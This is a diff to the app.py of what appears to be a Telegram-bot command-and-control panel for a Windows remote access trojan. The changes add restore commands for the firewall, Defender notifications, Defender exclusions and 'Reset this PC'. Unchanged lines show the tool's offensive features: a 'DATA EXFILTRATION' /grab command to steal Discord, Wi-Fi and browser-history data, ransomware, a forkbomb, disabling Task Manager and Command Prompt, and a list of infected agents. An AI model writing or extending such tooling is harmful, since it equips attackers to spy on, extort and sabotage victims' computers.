@@ -1,6 +1,6 @@
-# app.py (v43.1_LOCKDOWN_CMD_UPDATE)
-# - ADDED: All new system lockdown commands (/disabletaskmgr, /restorecmd, etc.) to the generic command handler.
-# - MODIFIED: Updated the /help menu with a new "System Lockdown" section to list the new commands.
+# app.py (v44.1_RESTORE_CMDS)
+# - ADDED: New system restore commands (/restorefirewall, /restoresystemreset, etc.) to the command handler.
+# - MODIFIED: Updated the /help menu with a new "System Restore" section to list the new commands.
 
 import os
 import re
@@ -130,8 +130,8 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
             safe_user = html.escape(user)
             
             response_text += f"{is_selected} <b>ID:</b> <code>{safe_id}</code>\n"
-            response_text += f"   <b>User:</b> <code>{safe_user} ({is_admin})</code>\n"
-            response_text += f"   <b>Last Seen:</b> {time_ago}\n\n"
+            response_text += f"    <b>User:</b> <code>{safe_user} ({is_admin})</code>\n"
+            response_text += f"    <b>Last Seen:</b> {time_ago}\n\n"
 
         if page < total_pages:
             response_text += f"\n<i>To see the next page, type <code>/list {page + 1}</code></i>"
@@ -220,13 +220,18 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "<code>/unblockmouse</code> - Enable mouse input\n\n"
         "<b>🛡️ SYSTEM LOCKDOWN (Admin)</b>\n"
         "<code>/disabletaskmgr</code> - Disable Task Manager\n"
-        "<code>/restoretaskmgr</code> - Restore Task Manager\n"
         "<code>/disablecmd</code> - Disable Command Prompt\n"
-        "<code>/restorecmd</code> - Restore Command Prompt\n"
         "<code>/disableuninstall</code> - Disable App Uninstall\n"
+        "<code>/disablebrowserdownloads</code> - Block browser file downloads\n\n"
+        "<b>♻️ SYSTEM RESTORE (Admin)</b>\n"
+        "<code>/restoretaskmgr</code> - Restore Task Manager\n"
+        "<code>/restorecmd</code> - Restore Command Prompt\n"
         "<code>/restoreuninstall</code> - Restore App Uninstall\n"
-        "<code>/disablebrowserdownloads</code> - Block browser file downloads\n"
-        "<code>/restorebrowserdownloads</code> - Restore browser file downloads\n\n"
+        "<code>/restorebrowserdownloads</code> - Restore browser file downloads\n"
+        "<code>/restorefirewall</code> - Re-enable the system firewall\n"
+        "<code>/restoresystemreset</code> - Re-enable the 'Reset this PC' feature\n"
+        "<code>/restoredefendernotifications</code> - Restore Defender notifications\n"
+        "<code>/removedefenderexclusion</code> - Remove agent's Defender exclusion\n\n"
         "<b>🔑 DATA EXFILTRATION</b>\n"
         "<code>/grab &lt;type&gt;</code> - Steal data (discord, wifi, history, etc.)\n"
         "  <i>Types: all, discord, wifi, history</i>\n\n"
@@ -259,9 +264,11 @@ agent_commands = [
     "unblockmouse", "forkbomb", "cancelforkbomb", "ransomware", "restore", "tts", 
     "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen", "jumpscare", 
     "startchat", "sendchat", "stopchat",
-    # New Lockdown Commands
+    # Lockdown Commands
     "disabletaskmgr", "restoretaskmgr", "disablecmd", "restorecmd", "disableuninstall", 
-    "restoreuninstall", "disablebrowserdownloads", "restorebrowserdownloads"
+    "restoreuninstall", "disablebrowserdownloads", "restorebrowserdownloads",
+    # New Restore Commands
+    "restorefirewall", "restoresystemreset", "restoredefendernotifications", "removedefenderexclusion"
 ]
 for cmd in agent_commands: ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
 
